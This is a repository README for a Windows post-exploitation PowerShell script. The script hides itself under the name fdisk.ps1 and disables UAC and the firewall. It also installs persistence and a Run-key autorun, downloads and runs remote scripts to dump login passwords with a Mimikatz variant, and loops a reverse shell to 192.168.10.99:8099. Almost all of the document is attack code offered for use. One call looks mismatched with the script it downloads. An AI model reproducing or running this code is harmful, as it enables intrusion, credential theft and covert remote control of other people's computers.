# win_penetration

powered by [nishang](https://github.com/samratashok/nishang), [PowerSploit](https://github.com/mattifestation/PowerSploit)

### main behaviour
- bypass UAC and extract payload to tmp directory
- run the payload script
    - add powershell root path to env path
	- copy self to temp path and powershell root path
    - turn of the LUA and firewall
	- add persistence
	- register self to auto-run
	- dump login user password
	- run PowerShellTcp listenning on 192.168.10.99:8099


### 1.ps1
```
# add powershell root path to env path
$Env:path=$Env:Path+";C:\Windows\System32\WindowsPowerShell\v1.0\"  

# copy self to temp path
cp $MyInvocation.MyCommand.Path $env:temp\fdisk.ps1

# copy self to powershell root path
cp $MyInvocation.MyCommand.Path "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1"


if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
	
	# turn of the LUA and firewall
	Set-ItemProperty -Path HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System -Name EnableLUA -Value 0x00000000
	netsh advfirewall set allprofiles state off

	# add persistence
	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Add-Persistence.ps1')
	Add-Persistence -ScriptPath $MyInvocation.MyCommand.Path

	# auto-run
	New-ItemProperty -Path HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/run -Name fdisk -PropertyType String -Value "powershell echo"

	# dump login user password
	$strFileName="c:\windows\z_account.log"
	If (Test-Path $strFileName){
		# // File exists
	
	}Else{
		# // File does not exist
		IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1')
		Invoke-MimikatzWDigestDowngrade
		Get-Job | Receive-Job | Out-File c:\windows\zzzjob.log
		get-job | wait-job
	}


	# shell reverse
	While(1){
		Try {
			start-job {
				IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
				Invoke-PowerShellTcp -Reverse -IPAddress 192.168.10.99 -Port 8099
			}
			get-job | wait-job
		}
		Catch {
			Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
		}
		Start-Sleep -Seconds 3
	}
	
} else {
	powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File $env:temp\fdisk.ps1
}

```